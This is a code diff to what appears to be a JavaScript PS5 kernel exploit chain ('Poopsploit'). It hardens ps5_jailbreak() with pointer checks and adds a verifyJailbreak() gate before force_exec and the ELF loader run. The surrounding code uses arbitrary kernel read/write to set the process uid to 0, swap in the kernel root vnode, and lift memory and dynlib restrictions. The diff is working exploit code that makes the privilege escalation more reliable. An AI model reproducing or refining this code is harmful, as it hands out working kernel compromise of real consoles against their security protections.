@@ -1955,8 +1955,28 @@ function pfind(pid) {
 /* -------------------------------------------------------------- jailbreak */
 
 function ps5_jailbreak() {
-    const p = ST.curproc;
-    const cred = KRW.r64(p + 0x40n);
+    /* Validate every pointer before writing through it.
+     *
+     * This function used to chase p+0x40 / p+0x48 / p+0x3E8 / dyn+0 / eboot+0x40
+     * and write to all of them with no checks at all. That is the most dangerous
+     * unguarded code in the chain: by the time it runs we hold arbitrary kernel
+     * WRITE, so if curproc is wrong or a KRW read returns garbage, it does not
+     * fail — it scatters writes across unrelated kernel memory and panics the
+     * console, with the log ending mid-run and nothing to attribute it to.
+     *
+     * Every value here is a kernel pointer that must satisfy isKernelPtr, so
+     * checking costs one comparison per hop and converts a panic into a clean
+     * throw that run()'s caller can report. */
+    const need = (name, v) => {
+        if (!isKernelPtr(v))
+            throw new Error("ps5_jailbreak: " + name + " = " + hex(v)
+                            + " is not a kernel pointer — refusing to write "
+                            + "(KRW is unreliable or curproc is wrong)");
+        return v;
+    };
+
+    const p = need("curproc", ST.curproc);
+    const cred = need("p_ucred", KRW.r64(p + 0x40n));
     log("p_ucred=" + hex(cred) + " uid=" + hex(KRW.r32(cred + 0x04n)));
 
     KRW.w32(cred + 0x04n, 0);   // cr_uid
@@ -1984,20 +2004,20 @@ function ps5_jailbreak() {
        would not reliably grant. */
     KRW.w8 (cred + 0x83n, 0x80);   // cr_sceAttr[0], same as upstream
 
-    const p_fd   = KRW.r64(p + 0x48n);
-    const kern   = pfind(KERNEL_PID);
-    const kfd    = KRW.r64(kern + 0x48n);
-    const rootvn = KRW.r64(kfd + ROOTVNODE_OFFSET);
+    const p_fd   = need("p_fd", KRW.r64(p + 0x48n));
+    const kern   = need("pfind(0)", pfind(KERNEL_PID));
+    const kfd    = need("kernel p_fd", KRW.r64(kern + 0x48n));
+    const rootvn = need("rootvnode", KRW.r64(kfd + ROOTVNODE_OFFSET));
     KRW.w64(p_fd + 0x08n, rootvn);
     KRW.w64(p_fd + 0x10n, rootvn);
     KRW.w64(p_fd + 0x18n, 0);
 
-    const dyn = KRW.r64(p + 0x3E8n);
+    const dyn = need("p_dynlib", KRW.r64(p + 0x3E8n));
     KRW.w64(dyn + 0xF0n, 0);
     KRW.w64(dyn + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
 
-    const eboot = KRW.r64(dyn + 0x00n);
-    const segs  = KRW.r64(eboot + 0x40n);
+    const eboot = need("eboot obj", KRW.r64(dyn + 0x00n));
+    const segs  = need("eboot segs", KRW.r64(eboot + 0x40n));
     KRW.w64(segs + 0x08n, 0);
     KRW.w64(segs + 0x10n, 0xFFFFFFFFFFFFFFFFn);
 
@@ -2608,6 +2628,62 @@ function run() {
                + " authid=" + hex(KRW.r64(KRW.r64(ST.curproc + 0x40n) + 0x58n)));
         beacon("JB curproc=" + hex(ST.curproc) + " allproc=" + hex(ST.allproc));
     } catch (e) { beacon("JB proof failed: " + e.message); }
+
+    /* Everything below this point WRITES kernel memory — force_exec() stamps
+     * protection bits into a vm_map_entry, buildLapseKRW() rewrites a socket's
+     * pktopts, and elfldr is handed a kdata_base it keys all its own kernel
+     * offsets off. None of that is safe unless the jailbreak actually landed.
+     *
+     * It used to run unconditionally. The proof above is inside a try/catch
+     * that only BEACONS a failure, so a run where ps5_jailbreak() did not take
+     * — or where KRW is returning garbage — would print "KERNEL EXPLOITED",
+     * then compute kdata_base from a bogus allproc and let elfldr write to
+     * whatever kernel addresses that implies. That is the same "wrong is worse
+     * than missing" hazard as the hardcoded kdata_base, at whole-jailbreak
+     * scale, and it ends in a panic rather than an error message.
+     *
+     * So prove it first, and refuse rather than guess. */
+    function verifyJailbreak() {
+        const no = (why) => { beacon("JB VERIFY FAILED: " + why); return false; };
+
+        if (!isKernelPtr(ST.curproc)) return no("curproc " + hex(ST.curproc));
+        if (!isKernelPtr(ST.allproc)) return no("allproc " + hex(ST.allproc));
+
+        let ucred, uid, authid;
+        try {
+            ucred = KRW.r64(ST.curproc + 0x40n);
+            if (!isKernelPtr(ucred)) return no("ucred " + hex(ucred));
+            uid    = KRW.r32(ucred + 0x04n);
+            authid = KRW.r64(ucred + 0x58n);
+        } catch (e) { return no("kernel read threw: " + e.message); }
+
+        // ps5_jailbreak() sets both of these; if either is unchanged the
+        // escalation did not take even though nothing threw.
+        if (uid !== 0) return no("uid=" + uid + " (expected 0)");
+        if (authid !== SYSCORE_AUTHID)
+            return no("authid=" + hex(authid) + " expected " + hex(SYSCORE_AUTHID));
+
+        /* kdata_base is the one value elfldr cannot sanity-check for itself.
+         * Every kernel in the 9.00-12.00 window has it 64 KB aligned
+         * (text_base + text_size: 0x...EB0000 / ED0000 / F40000 / F60000), so a
+         * garbage allproc almost never produces an aligned result. KASLR moves
+         * the absolute value, which is why alignment is checked and not it. */
+        let kdata;
+        try { kdata = computeKdataBase(); } catch (e) { return no(e.message); }
+        if (!isKernelPtr(kdata) || (kdata & 0xFFFFn) !== 0n)
+            return no("kdata_base implausible: " + hex(kdata));
+
+        beacon("JB VERIFIED uid=0 authid=" + hex(authid)
+               + " kdata_base=" + hex(kdata));
+        return true;
+    }
+
+    if (!verifyJailbreak()) {
+        beacon("phase: NOT JAILBROKEN — skipping force_exec/elfldr");
+        log("jailbreak did not verify; refusing to write kernel memory or "
+            + "start elfldr (reboot before retrying)");
+        return false;
+    }
 
     // on-screen notification: kernel is exploited (uid=0, arbitrary kernel R/W)
     sendNotification("Poopsploit: KERNEL EXPLOITED (uid=0, kernel R/W)");
